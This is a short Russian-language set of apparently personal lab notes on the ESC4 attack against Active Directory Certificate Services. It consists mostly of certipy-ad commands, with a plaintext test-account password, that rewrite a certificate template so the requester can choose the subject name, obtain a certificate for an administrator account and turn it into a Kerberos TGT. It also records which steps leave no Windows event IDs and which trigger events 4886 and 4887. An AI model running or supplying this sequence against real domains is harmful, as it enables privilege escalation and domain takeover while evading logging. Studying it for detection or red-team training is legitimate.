# ESC4

При стандартном SACL

(для отката шаблона) (нет никаких EID в журнале)
certipy-ad template -u 'test@work.local' -p 'Qpr1al9te!' -dc-ip 192.168.0.10 -template 'ESC4' -write-configuration ESC4.json -force

1) Сохраняем текущую конфигурацию шаблона в файл (бэкап) (нет никаких EID в журнале)
certipy-ad template -u 'test@work.local' -p 'Qpr1al9te!' -dc-ip 192.168.0.10 -template 'ESC4' -save-configuration esc4_backup.json

2) Редактируем сохраненный файл
Нужно поставить 1 для msPKI-Certificate-Name-Flag ("msPKI-Certificate-Name-Flag": 1,)

3) Применяем измененную конфигурацию обратно в AD  (нет никаких EID в журнале)

certipy-ad template -u 'test@work.local' -p 'Qpr1al9te!' -dc-ip 192.168.0.10 -template 'ESC4' -write-configuration esc4_backup.json

4) Запрашиваем серт для админа (4886 и 4887)
certipy-ad req -u 'test@work.local' -p 'Qpr1al9te!' -dc-ip 192.168.0.10 -ca 'work-DC01-CA' -template 'ESC4' -upn 'adm_yury@work.local'

5) Получаем TGT
certipy-ad auth -pfx 'adm_yury.pfx' -dc-ip 192.168.0.10



certipy-ad template -u 'test@work.local' -p 'Qpr1al9te!' -dc-ip 192.168.0.10 -template 'ESC1' -save-configuration ESC1.json